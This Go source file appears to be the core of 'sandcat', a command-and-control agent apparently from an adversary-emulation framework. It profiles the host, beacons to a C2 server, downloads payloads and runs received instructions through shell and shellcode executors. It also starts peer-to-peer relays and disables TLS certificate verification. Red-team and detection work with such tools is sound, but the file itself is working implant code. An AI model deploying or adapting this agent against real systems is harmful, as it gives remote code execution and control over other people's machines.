package core

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"time"

	"../contact"
	"../proxy"
	"../executors/execute"
	"../output"
	"../privdetect"
	"../util"

	_ "../executors/shellcode" // necessary to initialize all submodules
	_ "../executors/shells"    // necessary to initialize all submodules
)

var useP2pReceivers = false
var receiversActivated = false

// Will download each individual payload listed, and will return the full file paths of each downloaded payload.
func downloadPayloads(payloadListStr string, coms contact.Contact, profile map[string]interface{}) []string {
	var droppedPayloads []string
	payloads := strings.Split(strings.Replace(payloadListStr, " ", "", -1), ",")
	for _, payload := range payloads {
		if len(payload) > 0 {
			location := filepath.Join(payload)
			if util.Exists(location) == false {
				location, _ = coms.GetPayloadBytes(payload, profile["server"].(string), profile["paw"].(string),profile["platform"].(string), true)
			}
			droppedPayloads = append(droppedPayloads, location)
		}
	}
	return droppedPayloads
}

func activateP2pReceivers(profile map[string]interface{}, coms contact.Contact) {
	for receiverName, p2pReceiver := range proxy.P2pReceiverChannels {
		if p2pReceiver != nil {
			go p2pReceiver.StartReceiver(profile, coms)
		} else {
			output.VerbosePrint(fmt.Sprintf("[-] P2P Receiver for %s not found. Skipping.", receiverName))
		}
	}
}

func runAgent(coms contact.Contact, profile map[string]interface{}) {
	watchdog := 0
	checkin := time.Now()
	for {
		beacon := coms.GetInstructions(profile)
		if len(beacon) != 0 {
			profile["paw"] = beacon["paw"]
			checkin = time.Now()

			// We have established comms. Run p2p receivers if allowed.
			if useP2pReceivers && !receiversActivated {
				activateP2pReceivers(profile, coms)
				output.VerbosePrint("[*] Started up P2P receivers.")
				receiversActivated = true
			}
		}
		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
			cmds := reflect.ValueOf(beacon["instructions"])
			for i := 0; i < cmds.Len(); i++ {
				cmd := cmds.Index(i).Elem().String()
				command := util.Unpack([]byte(cmd))
				output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", command["id"]))
				droppedPayloads := downloadPayloads(command["payload"].(string), coms, profile)
				go coms.RunInstruction(command, profile, droppedPayloads)
				util.Sleep(command["sleep"].(float64))
			}
		} else {
			if len(beacon) > 0 {
				util.Sleep(float64(beacon["sleep"].(int)))
				watchdog = beacon["watchdog"].(int)
			} else {
				util.Sleep(float64(15))
			}
			util.EvaluateWatchdog(checkin, watchdog)
		}
	}
}

func buildProfile(server string, group string, executors []string, privilege string, c2 string) map[string]interface{} {
	host, _ := os.Hostname()
	profile := make(map[string]interface{})
	profile["server"] = server
	profile["group"] = group
	profile["host"] = host
	user, err := user.Current()
	if err != nil {
		profile["username"], err = exec.Command("whoami").CombinedOutput()
	} else {
		profile["username"] = user.Username
	}
	profile["architecture"] = runtime.GOARCH
	profile["platform"] = runtime.GOOS
	profile["location"] = os.Args[0]
	profile["pid"] = os.Getpid()
	profile["ppid"] = os.Getppid()
	profile["executors"] = execute.AvailableExecutors()
	profile["privilege"] = privilege
	profile["exe_name"] = filepath.Base(os.Args[0])
	return profile
}

func chooseCommunicationChannel(profile map[string]interface{}, c2Config map[string]string) contact.Contact {
	coms, _ := contact.CommunicationChannels[c2Config["c2Name"]]
	if !validC2Configuration(profile, coms, c2Config) {
		output.VerbosePrint("[-] Invalid C2 Configuration! Defaulting to HTTP")
		coms, _ = contact.CommunicationChannels["HTTP"]
	}
	return coms
}

func validC2Configuration(profile map[string]interface{}, coms contact.Contact, c2Config map[string]string) bool {
	if strings.EqualFold(c2Config["c2Name"], c2Config["c2Name"]) {
		if _, valid := contact.CommunicationChannels[c2Config["c2Name"]]; valid {
			return coms.C2RequirementsMet(profile, c2Config)
		}
	}
	return false
}

//Core is the main function as wrapped by sandcat.go
func Core(server string, group string, delay int, executors []string, c2 map[string]string, p2pReceiversOn bool, verbose bool) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	privilege := privdetect.Privlevel()
	output.SetVerbose(verbose)
	output.VerbosePrint("Started sandcat in verbose mode.")
	output.VerbosePrint(fmt.Sprintf("server=%s", server))
	output.VerbosePrint(fmt.Sprintf("group=%s", group))
	output.VerbosePrint(fmt.Sprintf("privilege=%s", privilege))
	output.VerbosePrint(fmt.Sprintf("initial delay=%d", delay))
	output.VerbosePrint(fmt.Sprintf("c2 channel=%s", c2["c2Name"]))
	output.VerbosePrint(fmt.Sprintf("allow p2p receivers=%v", p2pReceiversOn))
	useP2pReceivers = p2pReceiversOn

	profile := buildProfile(server, group, executors, privilege, c2["c2Name"])
	util.Sleep(float64(delay))
	for {
		coms := chooseCommunicationChannel(profile, c2)
		if coms != nil {
			for {
				runAgent(coms, profile)
			}
		}
		util.Sleep(300)
	}
}
